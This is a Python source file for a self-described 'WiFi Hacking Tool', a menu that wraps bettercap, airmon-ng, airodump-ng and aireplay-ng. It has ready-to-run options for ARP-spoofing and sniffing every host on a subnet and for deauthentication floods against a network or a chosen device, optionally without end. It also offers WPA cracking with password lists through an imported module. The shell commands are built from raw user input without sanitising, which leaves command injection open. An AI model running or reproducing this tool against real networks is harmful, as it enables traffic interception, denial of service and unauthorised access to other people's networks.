# -*- coding: utf-8 -*-
import os
import cruck
import subprocess
from termcolor import colored

def check_and_install_packages(packages):
    for package in packages:
        result = subprocess.run(['dpkg', '-l', package], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print("{} is not installed. Installing...".format(package))
            subprocess.run(['sudo', 'apt', 'install', package])
        else:
            print("{} is already installed.".format(package))

def print_header():
    header = """
 _____                                                                                _____ 
( ___ )                                                                              ( ___ )
 |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
 |   |         virsion 1.0                                                            |   |                                                                                
 |   |                                                                                |   | 
 |   |                                                                                |   | 
 |   |    ██╗    ██╗██╗███████╗██╗        ██╗  ██╗ █████╗ ██╗  ██╗███████╗██████╗     |   | 
 |   |    ██║    ██║██║██╔════╝██║        ██║  ██║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗    |   | 
 |   |    ██║ █╗ ██║██║█████╗  ██║        ███████║███████║█████╔╝ █████╗  ██████╔╝    |   | 
 |   |    ██║███╗██║██║██╔══╝  ██║        ██╔══██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗    |   | 
 |   |    ╚███╔███╔╝██║██║     ██║███████╗██║  ██║██║  ██║██║  ██╗███████╗██║  ██║    |   | 
 |   |     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    |   | 
 |   |                                                                                |   | 
 |   |                                                                                |   | 
 |   |                                                                                |   | 
 |   |                      Developing : waheeb Al_shrabi                             |   | 
 |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
(_____)                                                                              (_____)
           github:https://github.com/waheeb71/WiFi-Hacking-Tool.git                     
           telegram:SyberSc71


   
   """
    
    name = " waheeb Al_shrabi"
   
    header = header.replace(name, colored(name, 'red'))
    
    print(colored(header, 'green'))


def main():
    print_header()
   # packages_to_check = ['package1', 'package2', 'package3']  # Replace with actual package names
   
   # check_and_install_packages(packages_to_check)

    while True:
        BLUE = "\033[94m"
        RESET = "\033[0m"

        print(BLUE + "Choose an option to execute:")
        print("1. Display MAC addresses of devices on the network:")
        print("2. Display addresses and analyze network traffic:")
        print("3. Enter monitoring mode:")
        print("4.Crack closed networks with password lists")
        print("5. Exit" + RESET)
        PINK = "\033[95m"
        RESET = "\033[0m"
        choice = int(input(PINK + "Choose:" + RESET))

        if choice == 1:
            execute_bettercap()
        elif choice == 2:
            witcon()
        elif choice == 3:
            mointer()   
        elif choice == 4:
        
    
            network_interface = input("Enter network interface: ")
            os.system(f"sudo airmon-ng start { network_interface}")
            cruck.main()
       
            
        elif choice==5:    
           
            break
        else:
            print("Invalid choice, please try again.")


def execute_bettercap():
    header = """

                                   .-=-.
                                  ((. .))
                                   \ o /
                __,...,--.    .   .-`.'-.
              ,' :    |   \  (/\ /   : . \
             :   |    ;   ::  \ " ;  :  : )
          ,-.|   :  _//`. ;|   `.') /=\ (/
         (   \ .- \  `._// |     /.' : `.\
         |\   :   : _ |.-  :     '|  ;  |`
         :\: -:  _|\_||  .-(    _.|__|__|.
         :_:  _\\_`.--'  _  \,-'  '--'--' )
         .` \\_,)--'/ .'    (      ..'--`'
         |.- `-'.-               ,'
         :  ,'     .            ;
         :         :           /
          \      ,'         _,'
           `._       `-  ,-'
            : `--..     :
            |           |
            |           |
           github:waheeb71                      
           telegram:SyberSc71


   
   """
    namee = "waheeb71"
   
    header = header.replace(namee, colored(namee, 'green'))
    print(colored(header, 'red'))
   
    
    os.system("sudo bettercap -iface wlan0 -caplet bater1.cap")

    print("bettercap wlan0 on")
def witcon():
   
    header = """
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@                                                                                     @
@  █████   ███   █████   █████████   █████   █████ ██████████ ██████████ ███████████  @
@ ░░███   ░███  ░░███   ███░░░░░███ ░░███   ░░███ ░░███░░░░░█░░███░░░░░█░░███░░░░░███ @
@  ░███   ░███   ░███  ░███    ░███  ░███    ░███  ░███  █ ░  ░███  █ ░  ░███    ░███ @
@  ░███   ░███   ░███  ░███████████  ░███████████  ░██████    ░██████    ░██████████  @
@  ░░███  █████  ███   ░███░░░░░███  ░███░░░░░███  ░███░░█    ░███░░█    ░███░░░░░███ @
@   ░░░█████░█████░    ░███    ░███  ░███    ░███  ░███ ░   █ ░███ ░   █ ░███    ░███ @
@     ░░███ ░░███      █████   █████ █████   █████ ██████████ ██████████ ███████████  @
@      ░░░   ░░░      ░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░░░░░░ ░░░░░░░░░░ ░░░░░░░░░░░   @
@                     in yemen                                                        @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

           github:waheeb71                      
           telegram:SyberSc71
   """
    name = "yemen"
    a="waheeb71 "
    b="SyberSc71"
    d="@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
    header = header.replace(name, colored(name, 'blue'))
    header = header.replace(a, colored(a, 'green'))
    header = header.replace(b, colored(b, 'green'))
    header = header.replace(d, colored(d, 'red'))

    print(colored(header, 'red'))
    print("===========To go out .Write exit===========")
    router_ip = input("Please enter the router or device IP address: ")


    commands = f"""

net.probe on;
set arp.spoof.fullduplex true;
set arp.spoof.targets {router_ip}/24;
arp.spoof on;
set net.sniff.local true;
net.sniff on;
set net.sniff.output pcap_output.pcap

"""


    os.system(f"sudo bettercap -iface wlan0 -eval '{commands}'")


def mointer():
    namein = input("Enter the network interface name: ")
    os.system("airmon-ng start " + namein)
    header="""
            .              .   .'.     \   /
    \   /      .'. .' '.'   '  -=  o  =-
  -=  o  =-  .'   '              / | \
    / | \                          |
      |                            |
      |                            |
      |                      .=====|
      |=====.                |.---.|
      |.---.|                ||=o=||
      ||=o=||                ||   ||
      ||   ||                ||   ||
      ||   ||                ||___||
      ||___||                |[:::]|
      |[:::]|                '-----'
      '-----'

          
           github:waheeb71                      
           telegram:SyberSc71                   
                             
                           """
    namee = "waheeb71"
   
    header = header.replace(namee, colored(namee, 'red'))
    print(colored(header, 'green'))
   
    RED = "\033[91m"
    RESET = "\033[0m"

    print(RED + "================================" + RESET)
    print("[a]. Display nearby networks")
    print("[b]. Show connected devices on a network")
    print("[c]. Disconnect the network")
    print("[d]. Disconnect a specific device")
    print("[e]. Refresh page")
    print("[x]. Exit" + RESET)

    while True:
       RED = "\033[91m"
       RESET = "\033[0m"
       choice = input(RED+ "Choose (Enter 'e' to refresh the menu): " + RESET)
       if choice == 'a':
          uesr_in()
       elif choice == 'b':
          airodump()
       elif choice == 'c':
            disconnect_network()
       elif choice == 'd':
            disconnect_device()
    
       elif choice == 'e':
         mointer()

       elif choice == 'x':
         network_interface= input("Enter the network interface name: ")  
         os.system("airmon-ng start "+network_interface)
         break
          
       else:
          print("Invalid choice, please try again.")
        
       
RED = "\033[91m"
RESET = "\033[0m"

def disconnect_network():
    try:
     mac=input("Enter the MAC address for network:")
     duration = input("Enter the duration of the attack in seconds (0 for infinite): ")
     network_interface= input("Enter the network interface name: ")  
     os.system(f"sudo aireplay-ng --deauth {duration} -a {mac} {network_interface}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)
def disconnect_device():
    try:
     device_mac = input("Enter the device MAC address: ")
     router_mac = input("Enter the router MAC address: ")
     network_interface= input("Enter the network interface name: ")  
     duration = input("Enter the duration of the attack in seconds (0 for infinite): ")
     os.system(f"sudo aireplay-ng -0 {duration} -a {router_mac} -c {device_mac} {network_interface}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

def cat():
    try:
      network_interface= input("Enter the network interface name: ")  
      channel=input("Enter the new channel interface")
      os.system(f"iwconfig {network_interface} channel {channel}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

def uesr_in():
    try:
        network_interface= input("Enter the network interface name: ")  
        os.system("airodump-ng " + network_interface)
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

def airodump():
    try:
        mac = input("Enter the MAC address for network: ")
        #nameinrtf = input("Enter the network interface name: ")
        chan1 = input("Enter the network number channel: ")
        network_interface= input("Enter the network interface name: ") 
        os.system(f"airodump-ng -c {chan1} -b {mac} {network_interface}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

if __name__ == "__main__":
    main()
